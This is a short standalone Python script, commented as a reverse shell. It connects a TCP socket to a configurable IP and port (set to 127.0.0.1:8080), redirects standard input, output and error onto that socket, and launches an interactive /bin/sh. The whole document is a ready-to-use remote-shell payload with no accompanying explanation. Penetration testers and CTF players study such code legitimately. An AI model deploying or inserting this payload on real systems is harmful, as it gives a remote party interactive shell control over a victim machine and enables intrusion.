#!/usr/bin/python

EXTERN_IP="127.0.0.1"
EXTERN_PORT=8080

#reverse shell to IP EXTERN_IP and port EXTERN_PORT
import socket, subprocess, os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((EXTERN_IP, EXTERN_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
